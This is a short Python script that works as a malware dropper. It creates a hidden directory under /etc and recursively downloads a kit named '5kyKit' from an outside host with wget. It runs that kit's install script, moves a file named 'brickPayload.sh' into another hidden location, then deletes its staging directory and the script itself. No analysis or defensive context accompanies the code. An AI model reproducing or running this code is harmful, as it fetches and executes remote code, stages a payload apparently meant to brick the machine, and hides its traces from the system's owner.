import os
import subprocess
from sys import argv
def main():
    directory = os.getcwd()
    os.system("mkdir /etc/.a")
    os.system("wget -P /etc/.a -r -l 2 https://files.ravenn.net/horror/5kyKit")
    os.system("mv /etc/.a/files.ravenn.net/horror/5kyKit /etc/.a")
    print("Download complete. Starting installer.")
    os.system("chmod +x /etc/.a/5kyKit/install.sh")
    os.system("bash /etc/.a/5kyKit/install.sh")
    print("Install complete. Preping brick payload.")
    os.system("mv /etc/.a/files.ravenn.net/horror/brickPayload.sh /etc/.music")
    print("Total completion. Goodbye")
    os.system("rm -rf /etc/.a")
    os.remove(argv[0])
main()